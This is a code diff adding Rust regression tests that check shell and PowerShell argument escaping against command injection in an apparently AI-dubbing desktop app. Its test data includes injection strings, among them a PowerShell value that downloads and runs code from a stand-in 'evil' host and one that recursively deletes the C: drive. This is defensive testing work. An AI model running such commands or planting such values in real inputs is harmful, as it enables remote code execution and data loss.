@@ -47,3 +47,95 @@ fn test_null_byte_sanitization() {
     let good_path = "C:\\Videos\\clean_video.mp4";
     assert!(PathMapper::sanitize_path(good_path).is_ok());
 }
+
+/// Regression test for the `VENV="{0}"` / `WORKSPACE="{0}"` shell-injection bug
+/// found in `wizard/checker.rs`, `wizard/installer.rs`, `pipeline/orchestrator.rs`
+/// and `wsl/bridge.rs`: `venv_path` and `workspace_dir` come from user-editable
+/// `AppConfig` (settable via the `save_config` / `import_config_toml` commands),
+/// and were being spliced into bash double-quoted assignments — which still
+/// expand `$(...)` and backticks — instead of the safely single-quoted
+/// `escape_bash_arg` output every other config-derived value already uses.
+///
+/// This test shells out to a real `bash` (skipped where unavailable, e.g. on
+/// Windows CI runners) and proves that a malicious `workspace_dir` value can no
+/// longer execute code when assigned using the fixed `VAR={escaped}` pattern,
+/// mirroring exactly how the production code now builds these commands.
+#[test]
+fn test_workspace_var_assignment_blocks_command_substitution() {
+    use std::process::Command;
+
+    if Command::new("bash").arg("--version").output().is_err() {
+        eprintln!("bash not available in this environment, skipping");
+        return;
+    }
+
+    let marker = std::env::temp_dir().join("ai_dubbing_injection_test_marker");
+    let _ = std::fs::remove_file(&marker);
+
+    let malicious_workspace = format!(
+        "~/foo\"; touch {}; echo \"",
+        marker.display()
+    );
+    let escaped = PathMapper::escape_bash_arg(&malicious_workspace);
+
+    // Exactly the pattern used in the fixed source: `WORKSPACE={escaped}`
+    // followed by the `~` expansion, with no extra double quotes around the
+    // placeholder — `escape_bash_arg` already supplies safe single quotes.
+    let script = format!(
+        r#"WORKSPACE={0}; WORKSPACE="${{WORKSPACE/#\~/$HOME}}"; echo "resolved:$WORKSPACE""#,
+        escaped
+    );
+
+    let output = Command::new("bash")
+        .arg("-c")
+        .arg(&script)
+        .output()
+        .expect("failed to run bash");
+
+    assert!(
+        !marker.exists(),
+        "command substitution executed — injection succeeded, VAR={{escaped}} pattern is NOT safe"
+    );
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    assert!(
+        stdout.contains("resolved:"),
+        "script should still run and print the resolved (inert) value, got: {}",
+        stdout
+    );
+
+    let _ = std::fs::remove_file(&marker);
+}
+
+/// Companion to `test_command_injection_prevention` for the PowerShell escaping
+/// helper used by `install_wsl2_ubuntu` (Windows-only `wsl_distro` interpolation
+/// into a `Start-Process -ArgumentList (...)` expression). A single `'` was
+/// previously enough to break out of the PowerShell single-quoted string and
+/// splice arbitrary script text into the surrounding `-Command` invocation.
+#[test]
+fn test_powershell_arg_escaping() {
+    let malicious_inputs = vec![
+        "Ubuntu'; iex(New-Object Net.WebClient).DownloadString('http://evil');'",
+        "Ubuntu' -Verb RunAs; Remove-Item -Recurse -Force C:\\;'",
+        "normal-Distro-22.04",
+    ];
+
+    for input in malicious_inputs {
+        let escaped = PathMapper::escape_powershell_arg(input);
+        assert!(escaped.starts_with('\''), "must start with quote: {escaped}");
+        assert!(escaped.ends_with('\''), "must end with quote: {escaped}");
+
+        // Every internal `'` must be doubled (PowerShell's single-quote escape),
+        // so the value can never terminate the string early.
+        let internal = &escaped[1..escaped.len() - 1];
+        let mut chars = internal.chars().peekable();
+        while let Some(c) = chars.next() {
+            if c == '\'' {
+                assert_eq!(
+                    chars.next(),
+                    Some('\''),
+                    "found an un-doubled single quote in: {escaped}"
+                );
+            }
+        }
+    }
+}
